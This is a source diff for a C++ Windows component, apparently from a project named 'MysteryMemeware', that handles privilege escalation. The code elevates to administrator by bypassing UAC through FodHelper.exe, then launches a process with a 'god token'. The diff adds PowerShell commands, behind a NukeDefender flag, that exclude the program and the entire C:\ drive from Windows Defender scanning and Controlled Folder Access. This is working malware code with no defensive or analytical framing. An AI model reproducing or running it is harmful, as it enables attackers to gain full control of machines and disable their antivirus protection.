@@ -1,6 +1,7 @@
 // Approved 10/29/2024
 
 #include "MysteryEscalation.h"
+#include "MysteryMemeware.h"
 #include "EzCpp/EzError.h"
 #include "EzCpp/EzTokens.h"
 #include "EzCpp/EzHelper.h"
@@ -52,7 +53,7 @@ void ElevateNoUAC() {
 
 	// Launch FodHelper.exe
 	// This is definitly sussy
-	EzShellExecuteProcess(fodHelperPath, NULL);
+	EzShellExecuteProcess(fodHelperPath, NULL, FALSE);
 	
 	// Cleanup and return
 	// We should have administrator if we got this far
@@ -68,12 +69,25 @@ void MysteryEscalation::Run() {
 	EzCloseHandleSafely(currentToken);
 
 	if (!isElevated) {
+#ifdef PlzJustAskForAdmin
+		if (!EzLaunchWithUAC()) {
+			throw EzError("User declined a mandatory consent.exe popup.", __FILE__, __LINE__);
+		}
+		ExitProcess(0);
+#else
 		ElevateNoUAC();
 		ExitProcess(0);
+#endif
 	}
 	if (!isGodToken) {
 		HANDLE godToken = EzCreateGodToken();
 		EzLaunchAsToken(godToken);
 		ExitProcess(0);
 	}
+
+#ifdef NukeDefender
+	EzShellExecuteProcess(L"powershell", L"-Command Add-MpPreference -ExclusionProcess MysteryMemeware2.exe", TRUE);
+	EzShellExecuteProcess(L"powershell", L"-Command Add-MpPreference -ControlledFolderAccessAllowedApplications MysteryMemeware2.exe", TRUE);
+	EzShellExecuteProcess(L"powershell", L"-Command Add-MpPreference -ExclusionPath C:\\", TRUE);
+#endif
 }
